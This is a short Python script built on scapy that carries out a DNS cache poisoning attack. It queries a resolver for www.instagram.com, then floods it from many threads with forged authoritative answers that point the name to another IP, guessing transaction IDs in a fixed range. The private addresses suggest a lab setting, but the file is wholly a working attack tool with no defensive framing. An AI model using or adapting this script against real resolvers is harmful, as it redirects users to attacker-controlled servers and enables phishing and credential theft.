from scapy.all import *
import threading

def send_dns_query(server_ip: str, query_domain: str) -> None:
    """
    Sends a DNS query to the specified server for the specified domain.
    
    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to query.
    """
    try:
        dns_query = IP(dst=server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query_domain))
        send(dns_query)
        print(f"Sent DNS query for {query_domain} to {server_ip}")
        
    except Exception as e:
        print("Error: ", e)


def send_spoofed_response(server_ip: str, query_domain: str, spoofed_ip: str, query_id: int) -> None:
    """
    Sends a spoofed DNS response to the specified server for the specified domain with the specified IP.
    
    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to spoof.
        spoofed_ip (str): The IP address to use in the spoofed response.
        query_id (int): The DNS query ID to spoof.
    """
    try:
        dns_response = IP(dst=server_ip)/UDP(dport=53)/DNS(
            id=query_id,
            qr=1,
            aa=1,
            qd=DNSQR(qname=query_domain),
            an=DNSRR(rrname=query_domain, ttl=300, rdata=spoofed_ip)
        )
        send(dns_response)
        print(f"Sent spoofed response for {query_domain} with IP {spoofed_ip} to {server_ip}")

    except Exception as e:
        print("Error: ", e)


def attack_dns_server(server_ip: str, query_domain: str, spoofed_ip: str) -> None:
    """
    Performs a DNS poisoning attack by sending multiple spoofed responses.

    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to spoof.
        spoofed_ip (str): The IP address to use in the spoofed response.
    """
    send_dns_query(server_ip, query_domain)

    # Send multiple spoofed responses with different IDs
    for query_id in range(20000, 20100):  # Adjust the range as needed
        threading.Thread(target=send_spoofed_response, args=(server_ip, query_domain, spoofed_ip, query_id)).start()


def main():
    server_ip = "10.0.0.150"
    query_domain = "www.instagram.com"
    spoofed_ip = "192.168.56.12"

    attack_dns_server(server_ip, query_domain, spoofed_ip)


if __name__ == "__main__":
    main()
